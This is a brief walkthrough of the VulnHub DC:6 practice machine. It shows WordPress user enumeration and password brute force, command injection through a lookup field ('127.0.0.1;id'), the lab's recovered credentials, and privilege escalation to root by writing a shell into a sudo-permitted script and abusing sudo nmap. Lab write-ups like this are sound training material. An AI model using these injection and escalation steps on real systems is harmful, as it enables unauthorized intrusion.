
# DC:6 Walkthrough

**VulnHub Link:** [DC:6](https://www.vulnhub.com/entry/dc-6,315/)
**Difficulty:** Easy  
**Release Date:** 26 Apr 2019

---

## 1. Reconnaissance

### Nmap Scan

nmap -A -O -T4 -P -sV 192.168.100.130

sudo echo "192.168.100.130	wordy" /etc/hosts

zgrep "k01" /usr/share/wordlists/rockyou.txt >> password.txt (stated on vulnhub due to not to lose much time on bruteforce)


## 2. Scanning & Enumeration

wpscan --url 'http://wordy' -e ap,u ---> (admin , graham , jens , mark , sarah) users found

wpscan --url 'http://wordy/' -U usernames.txt -P passwords.txt

mark - helpdesk01 found

on activity/tools , we check 127.0.0.1;id and click lookup --> retrieves output.!

127.0.0.1;cat /home/mark/stuff/things-to-do.txt 

graham - GSo7isUM1D4 found

connected with SSH 


## 3. Previlige Escalation

sudo -l (jens) NOPASSWD /home/jens/backups.sh 

sudo  echo "/bin/bash -i" > backups.sh

sudo -u jens ./backups.sh

--- jens's shell opened

sudo -l (root) NOPASSWD /usr/bin/nmap 

from GTFOBins 
----> TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF <----


and BINGO..! ROOT shell opened , Root flag captured.!
